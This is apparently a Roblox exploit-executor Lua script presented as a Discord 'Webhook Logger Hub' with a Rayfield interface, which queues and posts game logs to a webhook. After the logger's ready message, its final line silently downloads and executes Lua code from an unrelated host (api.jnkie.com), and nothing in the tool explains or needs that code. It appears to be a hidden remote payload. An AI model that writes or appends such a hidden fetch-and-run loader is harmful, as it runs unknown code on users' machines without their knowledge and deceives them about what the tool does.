--[[ 
    Webhook Logger Hub
    UI : Rayfield
    Discord : Webhook ONLY (NO BOT)
]]

----------------------------
-- LOAD RAYFIELD
----------------------------
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

----------------------------
-- SERVICES
----------------------------
local HttpService = game:GetService("HttpService")
local LogService = game:GetService("LogService")

----------------------------
-- LOGGER CORE
----------------------------
local Logger = {}
local state = {
    webhook = nil,
    enabled = false,
    queue = {},
    sending = false,
    interval = 1.5,
    redact = true,
    forwardLogs = false
}

----------------------------
-- HTTP REQUEST PICKER
----------------------------
local function requestHTTP(data)
    if syn and syn.request then
        return syn.request(data)
    elseif request then
        return request(data)
    elseif HttpService.RequestAsync then
        return HttpService:RequestAsync(data)
    end
end

----------------------------
-- REDACTION
----------------------------
local function redact(text)
    if not state.redact then return text end
    text = text:gsub("https://discord.com/api/webhooks/%S+", "[REDACTED_WEBHOOK]")
    text = text:gsub("[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+", "[REDACTED_TOKEN]")
    return text
end

----------------------------
-- QUEUE SENDER
----------------------------
local function processQueue()
    if state.sending then return end
    state.sending = true

    task.spawn(function()
        while #state.queue > 0 do
            local payload = table.remove(state.queue, 1)

            local body = {
                content = payload
            }

            pcall(function()
                requestHTTP({
                    Url = state.webhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(body)
                })
            end)

            task.wait(state.interval)
        end
        state.sending = false
    end)
end

----------------------------
-- SEND FUNCTION
----------------------------
function Logger.send(msg)
    if not state.enabled then return end
    msg = redact(tostring(msg))
    table.insert(state.queue, msg)
    processQueue()
end

function Logger.info(msg)
    Logger.send("🟢 **INFO**\n" .. msg)
end

function Logger.warn(msg)
    Logger.send("🟡 **WARN**\n" .. msg)
end

function Logger.error(msg, stack)
    local text = "🔴 **ERROR**\n" .. msg
    if stack then
        text = text .. "\n```" .. debug.traceback("", 2) .. "```"
    end
    Logger.send(text)
end

----------------------------
-- FORWARD LOGSERVICE
----------------------------
local logConnection
local function toggleForward(stateOn)
    state.forwardLogs = stateOn

    if stateOn and not logConnection then
        logConnection = LogService.MessageOut:Connect(function(msg, msgType)
            if msgType == Enum.MessageType.MessageError then
                Logger.error(msg, true)
            elseif msgType == Enum.MessageType.MessageWarning then
                Logger.warn(msg)
            end
        end)
    elseif not stateOn and logConnection then
        logConnection:Disconnect()
        logConnection = nil
    end
end

----------------------------
-- INIT LOGGER
----------------------------
function Logger.init(webhook)
    state.webhook = webhook
    state.enabled = true
    Logger.info("Webhook Logger Initialized")
end

----------------------------
-- RAYFIELD UI
----------------------------
local Window = Rayfield:CreateWindow({
    Name = "Webhook Logger Hub",
    LoadingTitle = "Webhook Logger",
    LoadingSubtitle = "Rayfield Hub",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "WebhookLogger",
        FileName = "Config"
    }
})

local Tab = Window:CreateTab("Logger", 4483362458)
Tab:CreateSection("Discord Webhook")

local webhookInput = ""
Tab:CreateInput({
    Name = "Webhook URL",
    PlaceholderText = "https://discord.com/api/webhooks/...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        webhookInput = text
    end
})

Tab:CreateButton({
    Name = "Init Webhook",
    Callback = function()
        if webhookInput == "" then
            Rayfield:Notify({
                Title = "Logger",
                Content = "Masukkan webhook terlebih dahulu",
                Duration = 3
            })
            return
        end
        Logger.init(webhookInput)
        Rayfield:Notify({
            Title = "Logger",
            Content = "Webhook berhasil diinisialisasi",
            Duration = 3
        })
    end
})

Tab:CreateButton({
    Name = "Send Test Log",
    Callback = function()
        Logger.info("Test log dari Hub")
    end
})

Tab:CreateButton({
    Name = "Send Error Test",
    Callback = function()
        Logger.error("Ini error test", true)
    end
})

Tab:CreateToggle({
    Name = "Forward Roblox Errors → Discord",
    CurrentValue = false,
    Callback = function(v)
        toggleForward(v)
    end
})

Tab:CreateToggle({
    Name = "Redact Webhook / Token",
    CurrentValue = true,
    Callback = function(v)
        state.redact = v
    end
})

Tab:CreateSlider({
    Name = "Rate Limit (detik)",
    Range = {0.5, 5},
    Increment = 0.5,
    CurrentValue = 1.5,
    Callback = function(v)
        state.interval = v
    end
})

----------------------------
-- READY
----------------------------
Rayfield:Notify({
    Title = "Webhook Logger",
    Content = "Hub siap digunakan (Webhook Only)",
    Duration = 4
})

loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/c69fb8387c07fc3590d40c70f91f84ef131ac7140dc4a68838da010793f5097d/download"))()
